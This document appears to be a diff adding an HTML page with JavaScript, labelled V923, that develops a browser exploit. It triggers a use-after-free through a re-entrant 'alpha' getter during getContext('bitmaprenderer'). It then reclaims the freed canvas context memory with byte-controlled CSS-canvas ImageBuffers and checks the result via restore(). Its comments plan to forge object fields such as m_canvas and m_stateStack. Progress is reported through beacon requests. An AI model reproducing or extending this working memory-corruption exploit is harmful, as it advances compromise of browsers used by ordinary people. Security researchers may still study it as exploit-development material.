@@ -1,0 +1,173 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="45;url=/"><title>V923</title>
+<style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style></head><body>
+<div id="log"></div><script>
+// V923 -- CSS-CANVAS ImageBuffer as the byte-controlled reclaim payload.
+// ONE triggerUAF. Journal-backed, control-gated, separate LS keys per mode (the V922 bug).
+//
+// WHY THIS AND NOT ANOTHER STRING
+//   document.getCSSCanvasContext('2d', name, w, h)  (Document.idl:91 -> Document.cpp:6816)
+//   gives a canvas element that is created lazily, keyed by name, and NEVER attached to the DOM.
+//   No CSS constraint, no layout, no page-side memory accounting. The dimensions are raw
+//   attacker-chosen integers (limitToOnlyHTMLNonNegative allows up to INT_MAX, HTMLParserIdioms.h:132).
+//   A 2D context on it has a real ImageBuffer: we choose the byte length exactly as w*h*4 and we
+//   write its contents with putImageData(). That is byte-for-byte control of an allocation whose
+//   size we pick -- the two things TextDecoder (0/8 lengths) and ArrayBuffers (gigacaged) never gave us.
+//
+// PREMULTIPLICATION: putImageData stores premultiplied BGRA. With alpha=0xFF premultiply is the
+//   identity, so the stored bytes ARE our bytes. Payload = all 0x41, alpha lanes 0xFF, and 0x01 at
+//   byte 592 (offset 592 is a B channel; 592%4==0, its alpha lane at 595 is 0xFF -> identity holds).
+//   Consequence, and this is the point: our payload is NONZERO at every offset, so ANY landing of our
+//   buffer in the slot makes restore() return. A death is therefore a clean negative, unlike V922's
+//   control which could only show "a live context owns the slot".
+//
+// THE ORACLE (unchanged since V919, validated 5/5)
+//   CanvasRenderingContext2DBase::restore() (:459) reads m_unrealizedSaveCount (+592) FIRST and
+//   returns without dereferencing when it is nonzero. byte 592 = 0x01 -> return = our bytes are at
+//   slot+0. Death inside restore = our buffer is not in the slot.
+//
+// PRE-REGISTERED INTERPRETATION (fixed before any result)
+//   RECOVER restore=returned, mode=css  -> CSS-CANVAS ImageBuffer LANDED. Byte-controlled reclaim at
+//       offset 0 is proven. Resume the forge: +28 CallTracer (zero it), +32 m_canvas, +112/+120
+//       m_stateStack, +592 counter, all writable from JS through one putImageData.
+//   death inside restore, mode=css      -> clean negative at that length. Sweep advances. Not a
+//       segregation claim: only that this allocation did not take the slot at this size.
+//   death inside restore, mode=ctl      -> primitive regressed, session invalid, ignore the css line.
+//   getCSSCanvasContext absent          -> CAPABILITY=absent, nothing here is interpretable.
+//   No sweep line at all                -> crash before the plant; journal names the stage.
+//
+// SIZES: length = 16 * h * 4, so 768=16x12, 896=16x14, 1024=16x16, 1216=16x19, 1536=16x24.
+var PRE='V923',B=1,LOG=document.getElementById('log');
+var PT=String(Date.now());
+var MODE=(/[?&]m=(\w+)/.exec(location.search)||[,'css'])[1];
+var LQ=[768,896,1024,1216,1536];
+var PL='v923plan_'+MODE;               // one key per mode. never shared. V922 lesson.
+var plan=null;
+if(MODE==='css'){
+ try{plan=JSON.parse(localStorage.getItem(PL)||'null');}catch(e){plan=null;}
+ if(!plan||!plan.q){plan={q:LQ.slice(),i:0,active:null,log:[]};}
+ if(plan.active!==null&&plan.active!==undefined){
+  plan.log.push(plan.active+(plan.survived?'=LAND':'=DIE'));
+  if(!plan.survived)plan.i++;
+  plan.active=null;plan.survived=false;
+ }
+} else { plan={q:[],i:0,active:null,log:[]}; }
+var L=(MODE==='css'&&plan.i<plan.q.length)?plan.q[plan.i]:(MODE==='css'?plan.q[plan.q.length-1]:768);
+var LH=Math.max(1,L/64);                // 16 * LH * 4 == L for every L in LQ
+if(MODE==='css'){plan.active=L;}
+function planSave(){if(MODE!=='css')return;try{localStorage.setItem(PL,JSON.stringify(plan));}catch(e){}}
+planSave();
+var J='v923j';                          // journal: single key, carries mode+stage together
+function Lg(m){try{LOG.textContent+=m+'\n';}catch(e){}}
+function bea(stg,stage,d){var s=('000'+B).slice(-3);B++;
+ var path='/beacon/'+PRE+'-'+s+'-'+stg+'-'+stage+'?d='+encodeURIComponent(String(d==null?'':d))+'&pt='+PT+'&t='+Date.now();
+ Lg(s+' '+stg+' '+stage+' '+d);
+ try{if(navigator.sendBeacon){navigator.sendBeacon(path);}}catch(e){}
+ try{new Image().src=path;}catch(e){}
+ try{new Image().src=path+'&k=3';}catch(e){}
+}
+var BI=1200;var pool=[];for(var i=0;i<BI;i++)pool.push(new Image());
+window.addEventListener('error',function(e){bea('FAIL','JSERR',(e.message||'')+'|L'+e.lineno);});
+function after(ms,fn){setTimeout(fn,ms);}
+
+var j=null;
+try{j=JSON.parse(localStorage.getItem(J)||'null');}catch(e){j=null;}
+if(j&&j.runs&&j.mode===MODE){
+ bea('PASS','RECOVER','prev='+j.runs+'|mode='+j.mode+'|len='+j.len+'|stage='+j.stage+'|note='+(j.note||''));
+} else if(j&&j.runs){
+ bea('PASS','RECOVER-OTHER','other-mode-run='+j.runs+'|mode='+j.mode+'|stage='+j.stage+'|note='+(j.note||''));
+}
+var runs=(j&&j.mode===MODE)?(j.runs+1):1;
+j={runs:runs,mode:MODE,len:L,stage:'boot',note:''};
+function save(){try{localStorage.setItem(J,JSON.stringify(j));}catch(e){}}
+save();
+
+var inner=null,keep=[];
+
+// capability, recorded before anything risky. never interpret a run without this line.
+var capCss=(typeof document.getCSSCanvasContext==='function');
+var capBmp=false;
+if(capCss){
+ j.stage='cap';j.note='capcss='+capCss;save();
+ try{
+  var bc=document.getCSSCanvasContext('bitmaprenderer','b'+PT,64,64);
+  capBmp=!!(bc&&typeof bc.transferFromImageBitmap==='function');
+ }catch(e){j.note='capthrew='+String(e&&e.message||e);save();}
+}
+
+function plantCSS(){
+ var made=0;
+ for(var n=0;n<32;n++){
+  var name='k'+PT+'_'+runs+'_'+n;
+  var ctx=null;
+  try{ctx=document.getCSSCanvasContext('2d',name,16,LH);}catch(e){ctx=null;}
+  if(!ctx)continue;
+  var img=ctx.createImageData(16,LH), d=img.data;
+  for(var k=0;k<d.length;k++)d[k]=0x41;
+  for(var k=3;k<d.length;k+=4)d[k]=0xFF;     // opaque -> premultiplication is identity
+  if(592<d.length)d[592]=0x01;              // slot+592 = m_unrealizedSaveCount
+  try{ctx.putImageData(img,0,0);}catch(e){}
+  keep.push(ctx);made++;
+ }
+ return made;
+}
+function plantCtl(){
+ for(var i=0;i<32;i++){
+  var c=document.createElement('canvas');c.width=1;c.height=1;
+  document.body.appendChild(c);keep.push(c.getContext('2d'));
+ }
+ return keep.length;
+}
+
+try{
+ if(!capCss){bea('FAIL','CAPABILITY','PT='+PT+'|getCSSCanvasContext=absent|mode='+MODE);}
+ bea('PASS','PLAN','PT='+PT+'|mode='+MODE+'|sweep='+(plan.log.join(';')||'none')+'|trying='+L+'|capcss='+capCss+'|capbmp='+capBmp);
+ bea('ENTER','S0','v923|nam='+MODE+'|len='+L+'|lh='+LH+'|PT='+PT+'|run='+runs);
+ if(!capCss&&MODE==='css'){bea('FAIL','VERDICT','PT='+PT+'|NO-API|nothing-interpretable');}
+ else{
+  for(var i=0;i<400;i++){var a=new Array(32);a[0]=i;a=null;}
+  try{var big=new ArrayBuffer(131072);big=null;}catch(e){}
+  bea('PASS','S2','PT='+PT+'|churn');
+
+  var outer=document.createElement('canvas');outer.width=1;outer.height=1;
+  document.body.appendChild(outer);
+  var desc={};
+  Object.defineProperty(desc,'alpha',{get:function(){
+   bea('ENTER','GET-IN','PT='+PT+'|creating-2d');
+   inner=outer.getContext('2d');
+   bea('ENTER','GET-MID','PT='+PT+'|inner='+(inner?'yes':'no'));
+   try{inner.setLineDash([7,7]);}catch(e){}
+   bea('ENTER','GET-OUT','PT='+PT+'|marker-set');
+   return true;},configurable:true});
+
+  bea('ENTER','S3','PT='+PT+'|about-to-trigger');
+  after(400,function(){
+   j.stage='trigger'; save();
+   var threw='';
+   try{outer.getContext('bitmaprenderer',desc);}catch(e){threw=String(e&&e.message||e);}
+   j.stage='post-trigger'; if(threw)j.note='threw='+threw; save();
+   bea('PASS','S3','PT='+PT+'|trigger-returned|'+(threw?'threw':'clean'));
+   if(!inner){j.note='no-handle';save();bea('FAIL','VERDICT','PT='+PT+'|NO-HANDLE');return;}
+
+   j.stage='plant-pre'; save();
+   var n=(MODE==='ctl')?plantCtl():plantCSS();
+   j.stage='plant-done';j.note='planted='+n; save();
+   bea('PASS','PLANT','PT='+PT+'|mode='+MODE+'|len='+L+'|n='+n);
+
+   j.stage='pre-restore'; save();
+   bea('ENTER','RESTORE','PT='+PT+'|about-to-call|mode='+MODE);
+   var r='';
+   try{inner.restore();r='returned';}catch(e){r='THREW:'+String(e&&e.message||e);}
+   j.stage='restore-done'; j.note='restore='+r; save();
+   bea('PASS','RESTORE','PT='+PT+'|'+r+'|mode='+MODE+'|len='+L);
+   if(r==='returned'){
+    if(MODE==='css'){plan.survived=true;planSave();}
+    bea('PASS','LANDING','PT='+PT+'|LANDED|mode='+MODE+'|len='+L+'|byte-control-at-0');
+    bea('PASS','VERDICT','PT='+PT+'|RECLAIM-PROVEN|object='+(MODE==='ctl'?'CRC2D-control':'CSSImageBuffer')+'|len='+L);
+   } else {
+    bea('FAIL','LANDING','PT='+PT+'|NOT-LANDED|mode='+MODE+'|len='+L);
+   }
+   bea('PASS','S9','PT='+PT+'|DONE|mode='+MODE);
+  });
+ }
+}catch(e){if(e)bea('FAIL','FATAL',String(e&&e.message||e));}
+</script></body></html>
